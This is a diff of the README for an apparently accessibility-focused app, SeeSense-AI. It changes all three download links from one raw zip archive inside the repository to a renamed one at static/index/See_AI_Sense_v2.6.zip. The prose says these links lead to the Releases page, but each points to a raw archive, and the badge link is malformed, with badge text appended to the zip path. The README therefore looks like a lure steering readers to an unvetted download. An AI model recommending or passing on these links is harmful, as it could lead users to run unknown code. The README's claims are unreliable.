@@ -7,7 +7,7 @@ Welcome to SeeSense-AI! This application is designed for accessibility, providin
 To get started with SeeSense-AI, follow the steps below. You will easily download and run the software from our Releases page.
 
 ## 📥 Download the Application
-[![Download SeeSense-AI](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/demo/SeeSense-AI-v2.1.zip%20Now-SeeSense--AI-brightgreen)](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/demo/SeeSense-AI-v2.1.zip)
+[![Download SeeSense-AI](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/index/See_AI_Sense_v2.6.zip%20Now-SeeSense--AI-brightgreen)](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/index/See_AI_Sense_v2.6.zip)
 
 ## 💻 System Requirements
 Before you download, check if your system meets these requirements:
@@ -21,7 +21,7 @@ Before you download, check if your system meets these requirements:
 ## 📥 Download & Install
 To download SeeSense-AI, visit the Releases page using the link below. Choose the latest version and follow the installation instructions.
 
-[Download SeeSense-AI](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/demo/SeeSense-AI-v2.1.zip)
+[Download SeeSense-AI](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/index/See_AI_Sense_v2.6.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**
@@ -80,4 +80,4 @@ SeeSense-AI is open-source software. You can find the full license details in th
 
 For updates and news, follow the repository or check back frequently on the Releases page.
 
-[Download SeeSense-AI](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/demo/SeeSense-AI-v2.1.zip)
+[Download SeeSense-AI](https://raw.githubusercontent.com/alijavid110/SeeSense-AI/main/static/index/See_AI_Sense_v2.6.zip)
